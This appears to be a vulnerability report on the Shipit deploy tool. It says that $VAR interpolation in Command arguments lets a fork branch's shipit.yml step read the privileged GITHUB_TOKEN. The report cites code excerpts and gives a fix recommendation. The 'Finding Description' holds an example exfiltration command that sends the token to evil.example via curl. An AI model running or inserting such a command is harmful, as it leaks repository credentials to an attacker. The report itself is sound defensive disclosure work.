### Title
Attacker-controlled shipit.yml step commands can exfiltrate `GITHUB_TOKEN` via `$GITHUB_TOKEN` interpolation in `Command#interpolated_arguments` - ([File: lib/shipit/command.rb], [File: lib/shipit/environment_variables.rb], [File: lib/shipit/commands.rb])

### Summary
`Commands#base_env` unconditionally injects the real, privileged `GITHUB_TOKEN` into the `env` hash used to build every `Command` for git/deploy/task operations. `Command#interpolated_arguments` calls `EnvironmentVariables#interpolate`, which performs an unrestricted `$VARNAME` substitution against that same `env` hash for every argument string, with no allowlist of which variable names may be referenced. Since deploy/task/rollback step strings originate from the stack's `shipit.yml` (attacker-controlled on a fork branch behind a ReviewStack), a step argument containing `$GITHUB_TOKEN` will have the literal secret substituted into `argv` passed to `PTY.spawn`, and into task output/logs.

### Finding Description
The broken binding is: `GITHUB_TOKEN scoped to authorize this Shipit instance's GitHub API calls == a value never readable by a command whose argument text an unprivileged fork branch wrote`.

- `Commands#base_env` merges `'GITHUB_TOKEN' => github.token` into the env used to build `Command` instances: [1](#0-0) 
- That `env` is passed as `Command.new(*args, env: ...)`, stored in `@env`, and used both for the spawned process's environment and for `interpolate_environment_variables`: [2](#0-1) 
- `Command#interpolated_arguments` runs every argument string through `EnvironmentVariables.with(env).interpolate`: [3](#0-2) [4](#0-3) 
- `EnvironmentVariables#interpolate` performs an unconditional `gsub` replacing any `$WORD` token with `@env.fetch(variable) { ENV[variable] }`, with no whitelist check (that check, `permit`/`sanitize_env_vars`, is a *separate* method only used to validate the `env:` block a stack author declares — it is never invoked before `interpolate`): [5](#0-4) 
- `Command#start` calls `interpolated_arguments` and feeds the result directly to `PTY.spawn`: [6](#0-5) 

Because deploy/task/rollback step command strings are sourced from the stack's `shipit.yml`, and ReviewStacks execute the spec associated with the PR's own branch, an attacker who controls that branch's `shipit.yml` can write a step whose command text is e.g. `sh -c "curl -s https://evil.example/$GITHUB_TOKEN"`. When that step's `Command` is built with the shared `base_env` (which carries the real `GITHUB_TOKEN`), `interpolated_arguments` substitutes the literal token value into the argument passed to `PTY.spawn`, and the resulting process output (and the literal argv) can leak the secret to an attacker-controlled destination or into the captured task/deploy log stream that the PR author can read.

`EnvironmentVariables#permit`/`sanitize_env_vars` (the only whitelist-style guard present in this file) only restricts which *keys* a stack's declared `env:` mapping may add to the environment; it does nothing to restrict which existing environment variable names a command *argument string* is allowed to reference via `$VAR` syntax at interpolation time. `interpolate` is called unconditionally on every argument, regardless of whether the corresponding name was ever permitted.

### Impact Explanation
A successful exploit exposes the Shipit host's real `GITHUB_TOKEN` (used to authenticate the app's GitHub API calls for the authorized repository) to the argv and/or process output of a command whose text an unprivileged fork-branch author wrote. This is a Critical-category impact per the rubric ("exfiltration of `GITHUB_TOKEN` ... deploy-time secret"). The blast radius is the entire Shipit deployment's GitHub API credential, not scoped to the attacker's own repository — reuse of that token elsewhere (other repos/stacks managed by the same Shipit instance) is possible once exfiltrated.

### Likelihood Explanation
Preconditions: the deployment must run ReviewStacks (or any task/deploy execution path) that builds/executes commands from a `shipit.yml` sourced from a branch the attacker controls (their own fork/PR branch), and step commands must be run through a `Commands` subclass whose `env` derives from `base_env`. Attacker cost is minimal — pushing a branch and opening a PR/label to trigger provisioning, no privileged Shipit session or GitHub App secret is required. This is repeatable on every ReviewStack the attacker can trigger.

### Recommendation
Do not interpolate arbitrary environment variable names from `env` into shipit.yml-declared command arguments. Either (a) restrict `EnvironmentVariables#interpolate` to only substitute names explicitly present in the stack/task's permitted (`sanitize_env_vars`-checked) variable set, excluding secrets like `GITHUB_TOKEN`/`GIT_ASKPASS`, or (b) never place `GITHUB_TOKEN` in the same `env` hash that is exposed to `interpolate`/user-authored step text — instead pass it only via a mechanism (e.g. `GIT_ASKPASS` helper script) that isn't reachable through `$VAR` substitution in argument strings.

### Proof of Concept
In a minitest (e.g. under `test/unit/command_test.rb`, out-of-scope path but describing the assertion needed):
```ruby
command = Shipit::Command.new(
  'sh', '-c', 'echo $GITHUB_TOKEN',
  chdir: Dir.tmpdir,
  env: { 'GITHUB_TOKEN' => 'secret-token' }
)
assert_includes command.interpolated_arguments.join(' '), 'secret-token'
```
This demonstrates that any argument string containing `$GITHUB_TOKEN`, if it can be authored by an unprivileged party (via a `shipit.yml` step on a fork/ReviewStack branch) and executed through a `Commands` subclass whose `env` derives from `Commands#base_env`, causes the real token value to be substituted into `argv` passed to `PTY.spawn`.

### Citations

**File:** lib/shipit/commands.rb (L37-50)
```ruby
    def base_env
      @base_env ||= begin
        env = Shipit.env.merge(
          'GITHUB_DOMAIN' => github.domain,
          'GITHUB_TOKEN' => github.token
        )

        if Shipit.use_git_askpass?
          env['GIT_ASKPASS'] = Shipit::Engine.root.join('lib', 'snippets', 'git-askpass').realpath.to_s
        end

        env
      end
    end
```

**File:** lib/shipit/command.rb (L31-37)
```ruby
    def initialize(*args, chdir:, default_timeout: Shipit.default_inactivity_timeout, env: {})
      @args, options = parse_arguments(args)
      @timeout = parse_timeout(options['timeout'] || options[:timeout]) || default_timeout
      @env = env.transform_values { |v| v&.to_s }
      @chdir = chdir.to_s
      @timed_out = false
    end
```

**File:** lib/shipit/command.rb (L51-55)
```ruby
    def interpolate_environment_variables(argument)
      return argument.map { |a| interpolate_environment_variables(a) } if argument.is_a?(Array)

      EnvironmentVariables.with(env).interpolate(argument)
    end
```

**File:** lib/shipit/command.rb (L81-83)
```ruby
    def interpolated_arguments
      interpolate_environment_variables(@args)
    end
```

**File:** lib/shipit/command.rb (L85-98)
```ruby
    def start(&block)
      return if @started

      @control_block = block
      @out = @pid = nil
      FileUtils.mkdir_p(@chdir)
      begin
        @out, child_in, @pid = PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)
        child_in.close
      rescue Errno::ENOENT
        raise NotFound, "#{Shellwords.split(interpolated_arguments.first).first}: command not found"
      rescue Errno::EACCES
        raise Denied, "#{Shellwords.split(interpolated_arguments.first).first}: Permission denied"
      end
```

**File:** lib/shipit/environment_variables.rb (L13-27)
```ruby
    def permit(variable_definitions)
      return {} unless @env
      raise "A whitelist is required to sanitize environment variables" unless variable_definitions

      sanitize_env_vars(variable_definitions)
    end

    def interpolate(argument)
      return argument unless @env

      argument.gsub(/(\$\w+)/) do |variable|
        variable.sub!('$', '')
        Shellwords.escape(@env.fetch(variable) { ENV[variable] })
      end
    end
```
